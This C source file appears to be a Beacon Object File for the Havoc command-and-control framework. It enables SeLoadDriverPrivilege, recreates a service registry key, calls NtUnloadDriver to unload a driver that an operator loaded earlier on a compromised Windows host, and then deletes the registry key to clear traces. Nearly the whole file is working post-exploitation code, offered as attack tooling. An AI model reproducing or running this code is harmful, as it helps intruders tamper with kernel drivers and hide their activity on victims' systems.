#include "beacon.h"
#include "ntdefs.h"
#include "utils.h"

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$DeleteFileW(LPCWSTR);

static DWORD wlen_bytes(LPCWSTR s) {
    DWORD n = 0;
    while (s[n]) n++;
    return (n + 1) * sizeof(WCHAR);
}

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    // Arguments from Havoc:
    // arg1 (wchar): driver name used during load (e.g. abcdefgh)
    // arg2 (wchar): path to .sys file (optional, for deletion)
    int    drvNameLen = 0;
    int    sysPathLen = 0;
    LPWSTR driverName = (LPWSTR)BeaconDataExtract(&parser, &drvNameLen);
    LPWSTR sysPath    = (LPWSTR)BeaconDataExtract(&parser, &sysPathLen);

    if (!driverName) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid arguments\n");
        return;
    }

    // ── 0. Enable SeLoadDriverPrivilege ──────────────────────
    if (!EnablePrivilege(L"SeLoadDriverPrivilege")) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Failed to enable SeLoadDriverPrivilege\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[1] SeLoadDriverPrivilege OK\n");

    // ── 1. Build registry paths ───────────────────────────────
    WCHAR fullRegPath[512]     = {0};
    WCHAR relativeRegPath[512] = {0};

    LPCWSTR svcPrefix    = L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\";
    LPCWSTR svcPrefixRel = L"SYSTEM\\CurrentControlSet\\Services\\";

    LPWSTR fp = fullRegPath;
    LPCWSTR t = svcPrefix;
    while (*t)  *fp++ = *t++;
    LPCWSTR dn = driverName;
    while (*dn) *fp++ = *dn++;
    *fp = L'\0';

    LPWSTR rp = relativeRegPath;
    t = svcPrefixRel;
    while (*t)  *rp++ = *t++;
    dn = driverName;
    while (*dn) *rp++ = *dn++;
    *rp = L'\0';

    // ── 2. Recreate registry key for NtUnloadDriver ──────────
    // NtUnloadDriver requires the key to exist — recreate it temporarily
    HKEY  hKey   = NULL;
    DWORD dwDisp = 0;
    LONG  ret    = ADVAPI32$RegCreateKeyExW(
                       HKEY_LOCAL_MACHINE,
                       relativeRegPath,
                       0, NULL,
                       REG_OPTION_NON_VOLATILE,
                       KEY_WRITE,
                       NULL,
                       &hKey,
                       &dwDisp);

    if (ret != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] RegCreateKeyEx failed: %ld\n", ret);
        return;
    }

    // Populate with minimum required values
    DWORD dwType  = 1;
    DWORD dwStart = 3;
    DWORD dwError = 1;
    WCHAR dummy[] = L"\\??\\C:\\Windows\\System32\\drivers\\null.sys";

    ADVAPI32$RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ,
        (BYTE*)dummy, wlen_bytes(dummy));
    ADVAPI32$RegSetValueExW(hKey, L"Type", 0, REG_DWORD,
        (BYTE*)&dwType, sizeof(DWORD));
    ADVAPI32$RegSetValueExW(hKey, L"Start", 0, REG_DWORD,
        (BYTE*)&dwStart, sizeof(DWORD));
    ADVAPI32$RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD,
        (BYTE*)&dwError, sizeof(DWORD));
    ADVAPI32$RegCloseKey(hKey);
    BeaconPrintf(CALLBACK_OUTPUT, "[2] Registry key recreated\n");

    // ── 3. NtUnloadDriver ────────────────────────────────────
    _NtUnloadDriver pNtUnloadDriver = NTDLL$NtUnloadDriver;

    if (!pNtUnloadDriver) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtUnloadDriver not resolvable\n");
        ADVAPI32$RegDeleteKeyW(HKEY_LOCAL_MACHINE, relativeRegPath);
        return;
    }

    UNICODE_STRING uRegPath;
    USHORT pathLen = 0;
    while (fullRegPath[pathLen]) pathLen++;
    uRegPath.Length        = pathLen * sizeof(WCHAR);
    uRegPath.MaximumLength = uRegPath.Length + sizeof(WCHAR);
    uRegPath.Buffer        = fullRegPath;

    BeaconPrintf(CALLBACK_OUTPUT, "[3] Calling NtUnloadDriver...\n");
    NTSTATUS status = pNtUnloadDriver(&uRegPath);
    BeaconPrintf(CALLBACK_OUTPUT, "[4] NtUnloadDriver returned\n");

    // ── 4. Cleanup registry ───────────────────────────────────
    ADVAPI32$RegDeleteKeyW(HKEY_LOCAL_MACHINE, relativeRegPath);

    if (status == STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Driver unloaded. NTSTATUS: 0x%08X\n", status);
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] NtUnloadDriver failed. NTSTATUS: 0x%08X\n", status);
    }
}